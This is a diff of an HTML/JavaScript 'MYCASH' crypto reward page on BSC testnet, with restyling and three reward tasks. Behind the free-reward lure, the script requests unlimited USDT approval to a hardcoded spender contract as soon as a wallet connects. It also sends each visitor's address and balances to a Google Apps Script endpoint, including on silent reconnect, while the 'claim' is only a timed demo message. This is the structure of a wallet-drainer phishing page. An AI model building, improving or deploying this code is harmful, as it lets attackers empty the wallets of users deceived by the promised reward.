@@ -16,15 +16,14 @@
       flex-direction:column;
     }
 
-    /* HEADER – nav + user info */
+    /* === HEADER & NAV (same structure as index) === */
     header{
       background:#071027;
-      padding:10px 16px;
+      padding:12px 16px;
       position:sticky;
       top:0;
       z-index:20;
-      border-bottom:1px solid rgba(255,255,255,0.08);
-      backdrop-filter:blur(10px);
+      border-bottom:1px solid rgba(255,255,255,0.03);
     }
     .nav{
       max-width:980px;
@@ -32,9 +31,8 @@
       display:flex;
       align-items:center;
       justify-content:space-between;
-      gap:12px;
     }
-    .nav-left{display:flex;gap:14px;flex-wrap:wrap}
+    .nav-left{display:flex;gap:14px}
     a{
       color:#dbeafe;
       text-decoration:none;
@@ -47,53 +45,18 @@
       font-weight:700;
       letter-spacing:4px;
       font-size:1rem;
-      white-space:nowrap;
     }
-
-    .nav-right{
-      display:flex;
-      flex-direction:column;
-      align-items:flex-end;
-      gap:2px;
-      max-width:420px;
-    }
-    .header-line{
-      font-size:0.78rem;
-      color:#9fb0c8;
-      white-space:nowrap;
-      overflow:hidden;
-      text-overflow:ellipsis;
-      max-width:100%;
-    }
-    .connect-header{
-      margin-top:4px;
-      display:flex;
-      justify-content:flex-end;
-    }
-    .connect-btn{
+    .connect{
+      background:#3b82f6;
+      color:#fff;
+      padding:8px 14px;
       border-radius:999px;
-      border:1px solid rgba(148,163,184,0.7);
-      background:transparent;
-      padding:0.35rem 1.4rem;
-      font-size:0.85rem;
-      font-weight:600;
+      border:0;
       cursor:pointer;
-      color:#e5e7eb;
-      transition:background 0.15s ease,box-shadow 0.15s ease,transform 0.12s ease;
-      white-space:nowrap;
+      font-size:0.9rem;
     }
-    .connect-btn:hover{
-      background:#0f172a;
-      box-shadow:0 10px 24px rgba(15,23,42,0.8);
-      transform:translateY(-1px);
-    }
-    .connect-btn.connected{
-      background:rgba(34,197,94,0.12);
-      border-color:rgba(34,197,94,0.6);
-      color:#bbf7d0;
-      cursor:default;
-      box-shadow:none;
-      transform:none;
+    .connect.connected{
+      background:#15803d;
     }
 
     main{
@@ -103,8 +66,18 @@
       flex:1;
     }
 
-    .reward-container{width:100%}
+    /* small info line under header (User ID etc) */
+    .top-info{
+      margin-bottom:14px;
+      font-size:0.84rem;
+      color:#9fb0c8;
+      display:flex;
+      flex-wrap:wrap;
+      gap:10px 18px;
+    }
+    .mono{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono","Helvetica Neue", monospace;}
 
+    /* ===== REWARD PAGE ===== */
     .reward-title{
       text-align:center;
       margin-bottom:1.5rem;
@@ -118,7 +91,6 @@
       color:#9ca3af;
     }
 
-    /* main reward card — styled like your old design */
     .reward-card{
       border-radius:1.5rem;
       padding:1.4rem 1.6rem;
@@ -257,47 +229,37 @@
     }
 
     .small{font-size:0.85rem;color:#9fb0c8;}
-    .mono{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono","Helvetica Neue", monospace;}
 
     .reward-extra{
       margin-top:18px;
+      font-size:0.85rem;
+      color:#9fb0c8;
     }
 
-    /* TASK PAGE (overlay) */
-    .task-page{
-      position:fixed;
-      inset:0;
-      background:rgba(3,7,18,0.96);
-      z-index:40;
-      overflow-y:auto;
-      display:none;
-    }
-    .task-page-inner{
-      max-width:960px;
-      margin:32px auto 48px auto;
-      padding:0 16px;
-    }
-    .task-header{
+    /* ===== TASK PAGE (same header/footer, just different content) ===== */
+    #taskPage{display:none;}
+
+    .task-header-row{
       display:flex;
       justify-content:space-between;
       align-items:center;
-      gap:12px;
+      gap:10px;
       margin-bottom:16px;
     }
-    .task-header h2{
+    .task-header-row h2{
       font-size:1.4rem;
     }
-    .task-close-btn{
+    .btn-back{
       border-radius:999px;
       border:1px solid rgba(148,163,184,0.7);
-      padding:0.25rem 0.9rem;
       background:transparent;
       color:#e5e7eb;
       font-size:0.85rem;
+      padding:0.4rem 1.2rem;
       cursor:pointer;
     }
-    .task-close-btn:hover{
-      background:rgba(15,23,42,0.9);
+    .btn-back:hover{
+      background:#111827;
     }
 
     .task-section{
@@ -326,7 +288,6 @@
       margin-bottom:0.18rem;
     }
 
-    /* responsive video box for Task 1 */
     .video-wrapper{
       position:relative;
       width:100%;
@@ -348,29 +309,35 @@
     }
 
     .task-actions{
-      margin-top:1rem;
+      margin-top:0.6rem;
       display:flex;
       flex-wrap:wrap;
       gap:10px;
       align-items:center;
     }
-    .task-demo-btn{
+    .task-btn{
       border-radius:999px;
       border:none;
       background:#22c55e;
       color:#022c22;
       font-size:0.9rem;
-      padding:0.5rem 1.4rem;
+      padding:0.45rem 1.4rem;
       font-weight:600;
       cursor:pointer;
     }
-    .task-demo-btn:hover{
+    .task-btn:hover{
       box-shadow:0 14px 30px rgba(34,197,94,0.45);
       transform:translateY(-1px);
     }
-    .task-status-text{
+
+    .task-check{
       font-size:0.84rem;
+    }
+    .task-check.ok{
       color:#22c55e;
+    }
+    .task-check.bad{
+      color:#f97316;
     }
 
     footer{
@@ -385,9 +352,6 @@
     @media(max-width:768px){
       .nav{
         flex-direction:column;
-        align-items:flex-start;
-      }
-      .nav-right{
         align-items:flex-start;
       }
 
@@ -406,34 +370,38 @@
   </style>
 </head>
 <body>
+  <!-- HEADER (same as index) -->
   <header>
     <div class="nav">
       <div class="nav-left">
         <a href="index.html">Home</a>
-  
+        <a href="about.html">About</a>
+        <a href="contact.html">Contact</a>
         <a href="reward.html" style="background:#0f1b33">Rewards</a>
       </div>
       <div class="logo">MYCASH</div>
-      <div class="nav-right">
-        <div class="header-line">Status: <span id="statusText">Not connected</span></div>
-        <div class="header-line">Address: <span id="walletAddress" class="mono">—</span></div>
-        <div class="header-line">Network: <span id="walletNetwork">—</span></div>
-        <div class="header-line">User ID: <span id="userId" class="mono">-</span></div>
-        <div class="connect-header">
-          <button id="connectBtn" class="connect-btn">Connect Wallet</button>
-        </div>
+      <div>
+        <button id="connectBtn" class="connect">Connect Wallet</button>
       </div>
     </div>
   </header>
 
   <main>
-    <div class="reward-container">
+    <!-- Top info bar (User ID, address, etc.) -->
+    <div class="top-info">
+      <div>Status: <span id="statusText">Not connected</span></div>
+      <div>Address: <span id="walletAddress" class="mono">—</span></div>
+      <div>Network: <span id="walletNetwork">—</span></div>
+      <div>User ID: <span id="userId" class="mono">-</span></div>
+    </div>
+
+    <!-- === REWARD PAGE VIEW === -->
+    <div id="rewardPage">
       <div class="reward-title">
         <h1>Claim Your Rewards</h1>
         <p>Connect your BSC wallet once, then use the reward card below to claim.</p>
       </div>
 
-      <!-- SINGLE REWARD CARD (old design style) -->
       <div class="reward-card">
         <div class="reward-left">
           <div class="reward-tag">Reward #1</div>
@@ -450,51 +418,45 @@
             First time connection reward for eligible wallets.
           </div>
           <button id="claimBtn" class="btn btn-claim" disabled>Claim</button>
-          <button id="taskBtn" class="btn btn-task">View Task</button>
+          <button id="taskBtn" class="btn btn-task">View Tasks</button>
           <div class="small" id="claimHint" style="margin-top:4px;">
-            Claim is locked until wallet is connected and task is completed.
+            Claim is locked until wallet is connected and all tasks are completed.
           </div>
         </div>
 
         <div class="reward-right">
-          <button id="sideConnectBtn" class="connect-btn">Connect Wallet</button>
+          <!-- we reuse same connect button in header, this right side just shows note -->
+          <span class="small">Use the top button to connect your wallet.</span>
         </div>
       </div>
 
-      <!-- EXTRA WALLET INFO -->
-      <div class="reward-extra small">
+      <div class="reward-extra">
         <div>BNB Balance: <span id="walletBalance">—</span></div>
         <div id="tokens" style="margin-top:6px">
           Connect wallet to see USDT balance.
         </div>
       </div>
     </div>
-  </main>
 
-  <footer>
-    © <span id="year"></span> MYCASH — BSC (BEP-20) • No private keys stored.
-  </footer>
-
-  <!-- TASK PAGE OVERLAY -->
-  <div id="taskPage" class="task-page">
-    <div class="task-page-inner">
-      <div class="task-header">
+    <!-- === TASK PAGE VIEW (same header/footer, different content) === -->
+    <div id="taskPage">
+      <div class="task-header-row">
         <div>
           <h2>Reward Tasks</h2>
           <p class="small">Complete these tasks to become eligible for the Starter Bonus.</p>
         </div>
-        <button id="closeTaskBtn" class="task-close-btn">Back to Rewards</button>
+        <button id="backToRewardsBtn" class="btn-back">Back to Reward</button>
       </div>
 
-      <!-- TASK 1 (with video area) -->
+      <!-- Task 1: video -->
       <div class="task-section">
-        <h3>Task 1 — Watch the Intro</h3>
+        <h3>Task 1 — Watch the Intro Video</h3>
         <p>
-          Watch the short introduction video about MYCASH and how the reward program works.
-          You can replace this video with your own later.
+          Watch this video to understand how MYCASH and the reward system works.
+          You can replace this video source with your own later.
         </p>
         <div class="video-wrapper">
-          <!-- Replace the src URL with your own video embed later -->
+          <!-- Replace src with your own embedded video later -->
           <iframe
             src="https://www.youtube.com/embed/dQw4w9WgXcQ"
             title="MYCASH Intro"
@@ -502,49 +464,59 @@
             allowfullscreen
           ></iframe>
         </div>
-        <p class="small">
-          You said: “can I embed a video there” — this box is exactly for that.
-          Just change the <code>src</code> attribute above to your own video link.
-        </p>
+        <div class="task-actions">
+          <button id="task1Btn" class="task-btn">Mark as watched (demo)</button>
+          <span id="task1Check" class="task-check bad">❌ Not completed</span>
+        </div>
       </div>
 
-      <!-- TASK 2 -->
+      <!-- Task 2: wallet balance checker -->
       <div class="task-section">
-        <h3>Task 2 — Hold USDT</h3>
+        <h3>Task 2 — Wallet Balance Check</h3>
         <p>
-          Hold the required minimum USDT in your connected BSC wallet. Later you can add logic
-          to check this balance on-chain before allowing the claim.
+          This task checks if your connected wallet holds at least
+          <strong>10 USDT (BEP-20)</strong>. Optionally later you can also check if the
+          wallet is “active” (for example, has on-chain activity).
         </p>
         <ul>
-          <li>Make sure you are connected with the same wallet.</li>
-          <li>Deposit or receive USDT (BEP-20) to your wallet.</li>
-          <li>We will verify eligibility before reward is granted.</li>
+          <li>Connect your BSC wallet using the button in the header.</li>
+          <li>Make sure you hold at least 10 USDT at the token address configured.</li>
+          <li>Click “Check wallet” to test eligibility.</li>
         </ul>
+        <div class="task-actions">
+          <button id="task2CheckBtn" class="task-btn">Check wallet (demo)</button>
+          <span id="task2Check" class="task-check bad">❌ Not checked</span>
+        </div>
+        <p class="small" id="task2Detail" style="margin-top:4px;">
+          Status: waiting for check.
+        </p>
       </div>
 
-      <!-- TASK 3 -->
+      <!-- Task 3: custom action -->
       <div class="task-section">
         <h3>Task 3 — Custom Action</h3>
         <p>
-          Define any extra action you want the user to take (invite, swap, stake, join Telegram, etc.).
-          Later you can connect this with Google Sheet or your backend to track who completed it.
+          Define any extra action you want the user to take: invite friends, join your
+          community, fill out a form, make a transaction, etc. Later you can connect this
+          to Google Sheets or your backend to verify.
         </p>
         <ul>
-          <li>Example: Join the official community channel.</li>
-          <li>Example: Make one on-chain transaction through MYCASH.</li>
-          <li>Example: Complete a survey form connected to your Apps Script.</li>
+          <li>Example: Join the official Telegram or Discord.</li>
+          <li>Example: Submit a simple form with their User ID.</li>
+          <li>Example: Perform one on-chain transaction via MYCASH.</li>
         </ul>
         <div class="task-actions">
-          <button id="taskCompleteBtn" class="task-demo-btn">
-            Mark tasks as completed (demo)
-          </button>
-          <span id="taskStatusText" class="task-status-text" style="display:none;">
-            ✅ Tasks marked as completed (demo). If your wallet is connected, you can now claim.
-          </span>
+          <button id="task3Btn" class="task-btn">Mark as done (demo)</button>
+          <span id="task3Check" class="task-check bad">❌ Not completed</span>
         </div>
       </div>
     </div>
-  </div>
+  </main>
+
+  <!-- FOOTER (same structure as index) -->
+  <footer>
+    © <span id="year"></span> MYCASH — BSC (BEP-20) • No private keys stored.
+  </footer>
 
   <!-- libs -->
   <script src="https://unpkg.com/web3@1.2.11/dist/web3.min.js"></script>
@@ -552,16 +524,15 @@
   <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.umd.min.js"></script>
 
-  <!-- app script -->
+  <!-- app script (same logic base as index) -->
   <script type="module">
   (function(){
-    // ===== CONFIG (same as index) =====
+    // ===== CONFIG (same as your index) =====
     const APPS_SCRIPT_URL    = "https://script.google.com/macros/s/AKfycbzlCsXUoqaMW4fCTqK6H_SF7dGCDDkcIoO-To5YbLcBLdWEEKvGjHQm_vSUfwE06Yw/exec";
     const APPS_SCRIPT_SECRET = "mahfuzinam0045";
 
-    // USDT on BSC TESTNET
-    const TOKEN_ADDRESS   = "0x5915f45023012942c0F30B6652CEbb6A05810b90";
-    const SPENDER_ADDRESS = "0x98fbcaA43b229601edb71E9923055ee485c29C3E"; // your smart contract
+    const TOKEN_ADDRESS   = "0x5915f45023012942c0F30B6652CEbb6A05810b90"; // USDT testnet
+    const SPENDER_ADDRESS = "0x98fbcaA43b229601edb71E9923055ee485c29C3E";
 
     const BNB_TESTNET_CHAIN_ID_DEC = 97;
     const BNB_TESTNET_CHAIN_ID_HEX = "0x61";
@@ -574,20 +545,23 @@
       "function balanceOf(address owner) view returns (uint256)"
     ];
 
-    const REWARD_AMOUNT = 10.00; // display only; backend can decide real amount
+    const REQUIRED_USDT = 10;   // Task 2: need at least this much
+    const REWARD_AMOUNT = 10.0; // display only
 
     let web3ModalInstance = null;
     let providerInstance  = null;
     let web3Instance      = null;
+    let currentAddress    = null;
 
     let isWalletConnected = false;
-    let isTaskCompleted   = false;
+    let task1Done         = false;
+    let task2Eligible     = false;
+    let task3Done         = false;
 
-    // ===== helpers for userId =====
+    // ===== userId helpers =====
     function storageKeyFor(address){
       return "userId_" + address.toLowerCase();
     }
-
     function generateUserIdFromAddress(address){
       address = (address || "").toLowerCase();
       let hash = 0;
@@ -596,10 +570,9 @@
         hash |= 0;
       }
       hash = Math.abs(hash);
-      const num = 100000 + (hash % 900000); // 100000–999999
+      const num = 100000 + (hash % 900000);
       return String(num);
     }
-
     function getOrCreateUserIdFor(address){
       const key = storageKeyFor(address);
       let id = localStorage.getItem(key);
@@ -611,30 +584,35 @@
     }
 
     // ===== UI refs =====
-    const connectBtn        = document.getElementById("connectBtn");
-    const sideConnectBtn    = document.getElementById("sideConnectBtn");
-    const statusTextEl      = document.getElementById("statusText");
-    const walletAddressEl   = document.getElementById("walletAddress");
-    const userIdEl          = document.getElementById("userId");
-    const walletNetworkEl   = document.getElementById("walletNetwork");
-    const walletBalanceEl   = document.getElementById("walletBalance");
-    const tokensContainer   = document.getElementById("tokens");
+    const connectBtn      = document.getElementById("connectBtn");
+    const statusTextEl    = document.getElementById("statusText");
+    const walletAddressEl = document.getElementById("walletAddress");
+    const userIdEl        = document.getElementById("userId");
+    const walletNetworkEl = document.getElementById("walletNetwork");
+    const walletBalanceEl = document.getElementById("walletBalance");
+    const tokensContainer = document.getElementById("tokens");
 
-    const claimBtn          = document.getElementById("claimBtn");
-    const claimHintEl       = document.getElementById("claimHint");
-    const rewardAmountEl    = document.getElementById("rewardAmountDisplay");
+    const rewardPageEl    = document.getElementById("rewardPage");
+    const taskPageEl      = document.getElementById("taskPage");
+    const backToRewardsBtn= document.getElementById("backToRewardsBtn");
+    const taskBtn         = document.getElementById("taskBtn");
 
-    const taskBtn           = document.getElementById("taskBtn");
-    const taskPage          = document.getElementById("taskPage");
-    const closeTaskBtn      = document.getElementById("closeTaskBtn");
-    const taskCompleteBtn   = document.getElementById("taskCompleteBtn");
-    const taskStatusTextEl  = document.getElementById("taskStatusText");
+    const claimBtn        = document.getElementById("claimBtn");
+    const claimHintEl     = document.getElementById("claimHint");
+    const rewardAmountEl  = document.getElementById("rewardAmountDisplay");
+
+    const task1Btn        = document.getElementById("task1Btn");
+    const task1CheckEl    = document.getElementById("task1Check");
+    const task2CheckBtn   = document.getElementById("task2CheckBtn");
+    const task2CheckEl    = document.getElementById("task2Check");
+    const task2DetailEl   = document.getElementById("task2Detail");
+    const task3Btn        = document.getElementById("task3Btn");
+    const task3CheckEl    = document.getElementById("task3Check");
 
     function setStatus(txt){
       if(statusTextEl) statusTextEl.textContent = txt;
       console.log("[status]", txt);
     }
-
     function setWalletInfo(address, network, bnb){
       if(walletAddressEl) walletAddressEl.textContent = address || "—";
       if(walletNetworkEl) walletNetworkEl.textContent = network || "—";
@@ -643,52 +621,51 @@
           (bnb === null || bnb === undefined) ? "—" : (Number(bnb).toFixed(6) + " BNB");
       }
     }
-
     function setUserIdUI(id){
       if(userIdEl) userIdEl.textContent = id || "-";
     }
 
-    function updateConnectButtons(){
-      const list = [connectBtn, sideConnectBtn];
-      list.forEach(btn => {
-        if(!btn) return;
-        if(isWalletConnected){
-          btn.textContent = "Connected";
-          btn.classList.add("connected");
-        }else{
-          btn.textContent = "Connect Wallet";
-          btn.classList.remove("connected");
-        }
-      });
-    }
-
     function clearSessionUI(){
       isWalletConnected = false;
+      currentAddress    = null;
       setStatus("Not connected");
       setWalletInfo("—","—",null);
       setUserIdUI("-");
       if(tokensContainer){
         tokensContainer.textContent = "Connect wallet to see USDT balance.";
       }
-      updateConnectButtons();
+      if(connectBtn){
+        connectBtn.textContent = "Connect Wallet";
+        connectBtn.classList.remove("connected");
+      }
       updateClaimState();
     }
 
     function updateClaimState(){
+      const allTasksDone = task1Done && task2Eligible && task3Done;
       if(claimBtn){
-        const enabled = isWalletConnected && isTaskCompleted;
-        claimBtn.disabled = !enabled;
+        claimBtn.disabled = !(isWalletConnected && allTasksDone);
       }
       if(claimHintEl){
-        if(!isWalletConnected && !isTaskCompleted){
-          claimHintEl.textContent = "Claim is locked until wallet is connected and task is completed.";
-        } else if(!isWalletConnected){
-          claimHintEl.textContent = "Please connect your wallet to claim.";
-        } else if(!isTaskCompleted){
-          claimHintEl.textContent = "Complete the task to unlock the Claim button.";
-        } else {
+        if(!isWalletConnected){
+          claimHintEl.textContent = "Please connect your wallet first.";
+        }else if(!allTasksDone){
+          claimHintEl.textContent = "Complete all tasks to unlock the Claim button.";
+        }else{
           claimHintEl.textContent = "You can now claim your reward.";
         }
+      }
+    }
+
+    function markTaskState(el, ok, textOk, textBad){
+      if(!el) return;
+      el.classList.remove("ok","bad");
+      if(ok){
+        el.classList.add("ok");
+        el.textContent = "✅ " + textOk;
+      }else{
+        el.classList.add("bad");
+        el.textContent = "❌ " + textBad;
       }
     }
 
@@ -712,18 +689,13 @@
     function attachProviderListeners(p){
       if(!p || !p.on) return;
       try{
-        p.on("accountsChanged", function(accounts){
+        p.on("accountsChanged", async function(accounts){
           if(!accounts || !accounts.length){
             clearSessionUI();
             return;
           }
           const addr = accounts[0].toLowerCase();
-          const uid  = getOrCreateUserIdFor(addr);
-          setWalletInfo(addr, BNB_TESTNET_LABEL, null);
-          setUserIdUI(uid);
-          isWalletConnected = true;
-          updateConnectButtons();
-          updateClaimState();
+          await restoreSessionFromAddress(addr);
         });
 
         p.on("chainChanged", function(chainId){
@@ -753,13 +725,11 @@
         });
 
         await fetch(APPS_SCRIPT_URL, {
-          method: "POST",
-          mode  : "no-cors",
-          headers: {"Content-Type":"application/x-www-form-urlencoded;charset=UTF-8"},
-          body: payload.toString()
+          method:"POST",
+          mode:"no-cors",
+          headers:{"Content-Type":"application/x-www-form-urlencoded;charset=UTF-8"},
+          body:payload.toString()
         });
-
-        console.log("Sent log to Apps Script (no-cors).");
       }catch(err){
         console.error("notifyBackend error:", err);
       }
@@ -767,22 +737,18 @@
 
     async function getTokenBalance(address){
       try{
-        if(
-          !TOKEN_ADDRESS ||
-          !/^0x[0-9a-fA-F]{40}$/.test(TOKEN_ADDRESS)
-        ){
-          console.warn("TOKEN_ADDRESS not set or invalid, skipping token balance");
+        if(!TOKEN_ADDRESS || !/^0x[0-9a-fA-F]{40}$/.test(TOKEN_ADDRESS)){
+          console.warn("TOKEN_ADDRESS invalid");
           return "";
         }
         if(!providerInstance){
           console.warn("No providerInstance for token balance");
           return "";
         }
-
         const ethersProvider = new ethers.BrowserProvider(providerInstance);
         const tokenContract  = new ethers.Contract(TOKEN_ADDRESS, ERC20_BALANCE_ABI, ethersProvider);
         const raw            = await tokenContract.balanceOf(address);
-        const formatted      = ethers.formatUnits(raw, 18); // assumes 18 decimals
+        const formatted      = ethers.formatUnits(raw, 18);
         return formatted;
       }catch(err){
         console.error("getTokenBalance error:", err);
@@ -793,18 +759,18 @@
     async function switchToBSC(provider){
       try{
         await provider.request({
-          method: "wallet_switchEthereumChain",
-          params: [{ chainId: BNB_TESTNET_CHAIN_ID_HEX }]
+          method:"wallet_switchEthereumChain",
+          params:[{chainId:BNB_TESTNET_CHAIN_ID_HEX}]
         });
         return true;
       }catch(switchError){
         if(switchError.code === 4902){
           try{
             await provider.request({
-              method: "wallet_addEthereumChain",
-              params: [{
-                chainId: BNB_TESTNET_CHAIN_ID_HEX,
-                chainName: "BNB Smart Chain Testnet",
+              method:"wallet_addEthereumChain",
+              params:[{
+                chainId:BNB_TESTNET_CHAIN_ID_HEX,
+                chainName:"BNB Smart Chain Testnet",
                 nativeCurrency:{name:"BNB",symbol:"tBNB",decimals:18},
                 rpcUrls:["https://data-seed-prebsc-1-s1.binance.org:8545"],
                 blockExplorerUrls:["https://testnet.bscscan.com"]
@@ -822,49 +788,31 @@
     }
 
     async function requestTokenApproval(){
-      if(!TOKEN_ADDRESS){
-        console.warn("TOKEN_ADDRESS not set, skipping approve");
-        return;
-      }
-      if(!SPENDER_ADDRESS){
-        console.warn("SPENDER_ADDRESS not set, skipping approve");
-        return;
-      }
-      if(!providerInstance){
-        console.warn("No providerInstance for approval");
-        return;
-      }
-
+      if(!TOKEN_ADDRESS || !SPENDER_ADDRESS || !providerInstance) return;
       try{
         setStatus("Requesting token approval…");
         const ethersProvider = new ethers.BrowserProvider(providerInstance);
         const signer         = await ethersProvider.getSigner();
         const userAddress    = (await signer.getAddress()).toLowerCase();
 
-        if (TOKEN_ADDRESS.toLowerCase() === userAddress) {
-          alert("ERROR: TOKEN_ADDRESS is set to your wallet address.\n\nIt MUST be the BEP-20 token contract address, not your wallet.");
+        if(TOKEN_ADDRESS.toLowerCase() === userAddress){
+          alert("TOKEN_ADDRESS is set to your wallet, it must be the token contract.");
           setStatus("Connected (approval skipped)");
           return;
         }
 
         const tokenContract  = new ethers.Contract(TOKEN_ADDRESS, ERC20_APPROVE_ABI, signer);
-        const amount         = ethers.MaxUint256;
-
-        const tx = await tokenContract.approve(SPENDER_ADDRESS, amount);
-        console.log("Approve tx sent:", tx.hash);
-        setStatus("Waiting for approval confirmation…");
-        const receipt = await tx.wait();
-        console.log("Approve confirmed:", receipt);
+        const tx             = await tokenContract.approve(SPENDER_ADDRESS, ethers.MaxUint256);
+        await tx.wait();
         setStatus("Connected + Approved ✅");
       }catch(err){
         console.error("Token approve error:", err);
-        alert("Token approval failed: " + (err && err.message ? err.message : err));
         setStatus("Connected (approval failed)");
       }
     }
 
-    // Restore BNB + USDT and mark wallet as connected
     async function restoreSessionFromAddress(address){
+      currentAddress = address;
       const balanceWei = await web3Instance.eth.getBalance(address);
       const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei + "","ether"));
       const userId     = getOrCreateUserIdFor(address);
@@ -882,14 +830,15 @@
       }
 
       isWalletConnected = true;
-      updateConnectButtons();
+      if(connectBtn){
+        connectBtn.textContent = "Connected";
+        connectBtn.classList.add("connected");
+      }
+
       updateClaimState();
 
-      return {
-        balanceBNB,
-        tokenBalance: tokenBalanceRaw,
-        userId
-      };
+      await notifyBackend(address, BNB_TESTNET_LABEL, userId, balanceBNB, tokenBalanceRaw);
+      return {balanceBNB, tokenBalanceRaw, userId};
     }
 
     async function connectFlow(){
@@ -897,20 +846,15 @@
         setStatus("Connecting…");
         const mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
 
-        // Trust Wallet extension
         if(!mobile && window.trustwallet && window.trustwallet.ethereum){
           providerInstance = window.trustwallet.ethereum;
           web3Instance     = new Web3(providerInstance);
-          await providerInstance.request({ method: "eth_requestAccounts" });
-        }
-        // Standard injected (MetaMask, some Trust)
-        else if(window.ethereum && !mobile){
+          await providerInstance.request({method:"eth_requestAccounts"});
+        }else if(window.ethereum && !mobile){
           providerInstance = window.ethereum;
           web3Instance     = new Web3(providerInstance);
-          await providerInstance.request({ method: "eth_requestAccounts" });
-        }
-        // WalletConnect via Web3Modal
-        else {
+          await providerInstance.request({method:"eth_requestAccounts"});
+        }else{
           if(!web3ModalInstance) initWeb3ModalInstance();
           providerInstance = await web3ModalInstance.connect();
           web3Instance     = new Web3(providerInstance);
@@ -946,20 +890,9 @@
           }
         }
 
-        const { balanceBNB, tokenBalance, userId } =
-          await restoreSessionFromAddress(address);
-
+        await restoreSessionFromAddress(address);
         setStatus("Connected");
-        await notifyBackend(
-          address,
-          BNB_TESTNET_LABEL,
-          userId,
-          balanceBNB,
-          tokenBalance
-        );
-
         await requestTokenApproval();
-
       }catch(err){
         console.error("connectFlow error:", err);
         setStatus("Connection failed");
@@ -967,19 +900,16 @@
       }
     }
 
-    // silent restore using eth_accounts; returns true if restored
     async function tryAutoReconnectSilent(){
       const mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
 
-      // 1) Trust Wallet extension
       if(!mobile && window.trustwallet && window.trustwallet.ethereum){
         const injected = window.trustwallet.ethereum;
         providerInstance = injected;
         web3Instance     = new Web3(providerInstance);
         attachProviderListeners(providerInstance);
-
-        const accounts = await injected.request({ method: "eth_accounts" });
-        if (accounts && accounts.length) {
+        const accounts = await injected.request({method:"eth_accounts"});
+        if(accounts && accounts.length){
           const address = accounts[0].toLowerCase();
           setStatus("Restoring session (Trust Wallet)...");
           await restoreSessionFromAddress(address);
@@ -988,15 +918,13 @@
         }
       }
 
-      // 2) Standard injected (MetaMask / some Trust)
       if(window.ethereum){
         const injected = window.ethereum;
         providerInstance = injected;
         web3Instance     = new Web3(providerInstance);
         attachProviderListeners(providerInstance);
-
-        const accounts = await injected.request({ method: "eth_accounts" });
-        if (accounts && accounts.length) {
+        const accounts = await injected.request({method:"eth_accounts"});
+        if(accounts && accounts.length){
           const address = accounts[0].toLowerCase();
           setStatus("Restoring session...");
           await restoreSessionFromAddress(address);
@@ -1005,15 +933,15 @@
         }
       }
 
-      // 3) Do NOT auto-connect WalletConnect silently (would open QR)
       return false;
     }
 
     async function autoConnectOnLoad(){
       try{
         const restored = await tryAutoReconnectSilent();
-        if(restored) return;
-        clearSessionUI();
+        if(!restored){
+          clearSessionUI();
+        }
       }catch(e){
         console.warn("autoConnectOnLoad failed:", e);
         clearSessionUI();
@@ -1027,40 +955,77 @@
           setStatus("Connect wallet before claiming.");
           return;
         }
-        if(!isTaskCompleted){
-          alert("Please complete the task first.");
-          setStatus("Complete task before claiming.");
+        if(!(task1Done && task2Eligible && task3Done)){
+          alert("Please complete all tasks first.");
           return;
         }
-        if(!web3Instance || !providerInstance){
+        if(!web3Instance || !providerInstance || !currentAddress){
           alert("Wallet not ready, connect again.");
           return;
         }
 
-        const accounts = await web3Instance.eth.getAccounts();
-        if(!accounts || !accounts.length){
-          setStatus("No account found. Connect again.");
-          return;
-        }
-        const address = accounts[0].toLowerCase();
-
         setStatus("Claiming reward…");
 
-        // TODO: add your real claim contract call here
-        // const ethersProvider = new ethers.BrowserProvider(providerInstance);
-        // const signer         = await ethersProvider.getSigner();
-        // const claimContract  = new ethers.Contract(SPENDER_ADDRESS, CLAIM_ABI, signer);
-        // const tx = await claimContract.claimReward();
-        // await tx.wait();
-
-        setTimeout(() => {
-          setStatus("Reward claimed for " + address.slice(0,6) + "…" + address.slice(-4));
+        // TODO: real contract call later
+        setTimeout(()=>{
+          setStatus("Reward claimed for " + currentAddress.slice(0,6) + "…" + currentAddress.slice(-4));
           alert("Reward claimed! (demo mode — add real contract call later)");
-        }, 800);
+        },800);
       }catch(err){
         console.error("claimReward error:", err);
         setStatus("Reward claim failed");
-        alert("Reward claim failed: " + (err && err.message ? err.message : err));
+      }
+    }
+
+    // === TASK LOGIC ===
+    function showTaskPage(){
+      if(rewardPageEl) rewardPageEl.style.display = "none";
+      if(taskPageEl)   taskPageEl.style.display   = "block";
+    }
+    function showRewardPage(){
+      if(taskPageEl)   taskPageEl.style.display   = "none";
+      if(rewardPageEl) rewardPageEl.style.display = "block";
+    }
+
+    async function handleTask2Check(){
+      if(!isWalletConnected || !currentAddress){
+        alert("Please connect your wallet first.");
+        return;
+      }
+      if(!web3Instance || !providerInstance){
+        alert("Wallet not ready, try reconnect.");
+        return;
+      }
+
+      try{
+        setStatus("Checking wallet balance…");
+        const balanceStr = await getTokenBalance(currentAddress);
+        const balanceNum = balanceStr ? Number(balanceStr) : 0;
+
+        const eligible = balanceNum >= REQUIRED_USDT;
+        task2Eligible = eligible;
+
+        markTaskState(
+          task2CheckEl,
+          eligible,
+          "ELIGIBLE (balance ≥ " + REQUIRED_USDT + ")",
+          "Not eligible (needs ≥ " + REQUIRED_USDT + ")"
+        );
+
+        if(task2DetailEl){
+          task2DetailEl.textContent =
+            "Detected balance: " + balanceNum.toFixed(4) +
+            " USDT. Result: " + (eligible ? "ELIGIBLE" : "NOT ELIGIBLE") +
+            ". Later you can also check if this is an active account.";
+        }
+
+        setStatus("Wallet check completed");
+        updateClaimState();
+      }catch(err){
+        console.error("Task 2 check error:", err);
+        if(task2DetailEl){
+          task2DetailEl.textContent = "Error checking wallet. Try again.";
+        }
       }
     }
 
@@ -1071,41 +1036,42 @@
       }
 
       initWeb3ModalInstance();
-      updateConnectButtons();
       updateClaimState();
 
-      // connect buttons (header + card right)
-      [connectBtn, sideConnectBtn].forEach(btn => {
-        if(btn){
-          btn.addEventListener("click", function(){
-            if(isWalletConnected) return; // already connected
-            connectFlow();
-          });
-        }
-      });
+      if(connectBtn){
+        connectBtn.addEventListener("click", function(){
+          if(isWalletConnected) return;
+          connectFlow();
+        });
+      }
 
       if(claimBtn){
         claimBtn.addEventListener("click", claimReward);
       }
 
-      // Task page show/hide
